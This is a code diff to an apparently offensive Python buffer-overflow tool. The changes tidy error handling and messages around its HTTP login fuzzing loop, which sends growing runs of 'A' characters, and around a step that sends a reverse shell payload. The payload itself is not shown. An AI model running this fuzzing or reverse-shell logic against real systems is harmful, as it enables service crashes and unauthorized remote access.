@@ -406,7 +406,7 @@ class Overflow:
 
 		if not chars and not reverse_payload:
 			print(pe+bld+"[+]"+rst+" Intiating fuzzing procedure...")
-			print(yw+bld+"[!]"+rst+" Press Ctrl+C when the application crashes!!")
+			print(yw+bld+"[!]"+rst+" Press Ctrl+C when the application crashes!!!")
 			while self.num_bytes_crash <= self.max_fuzz_bytes:
 				content = "username=" + "A"*self.num_bytes_crash + "&password=A"
 				buff = self._HTTP_header()
@@ -421,7 +421,7 @@ class Overflow:
 					self.num_bytes_crash += self.fuzz_increment
 					sleep(self.fuzz_interval_seconds)
 				except KeyboardInterrupt:
-					print(rd+bld+"[!]"+rst +" Don't forget to set the number of bytes it took to crash the application")
+					print(rd+bld+"\n[!]"+rst +" Don't forget to set the number of bytes it took to crash the application")
 					exit(1)
 				except:
 					print(rd+bld+"[-]"+rst+f" Error occured...")
@@ -469,7 +469,7 @@ class Overflow:
 			print(gn+bld+"[+]"+rst+" Sending reverse shell payload...")
 			try:
 				soc.send(bytes(buff, "utf-8"))
-			except BaseException as err:
+			except socket.error as err:
 				print(rd+bld+"[-]"+rst+" Socket Error: {err}")
 				exit(1)
 			finally:
@@ -539,8 +539,11 @@ class Overflow:
 		try:
 			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			soc.connect((self.targ_ip, self.targ_port))
-		except BaseException as err:
-			print(print(rd+bld+"[-]"+rst+f" Socket Error: {err}"))
+		except socket.error as err:
+			print(rd+bld+"[-]"+rst+f" Socket Error: {err}")
+			exit(1)
+		except KeyboardInterrupt:
+			print(rd+bld+"\n[-]"+rst+" Terminating program...")
 			exit(1)
 		return soc
 
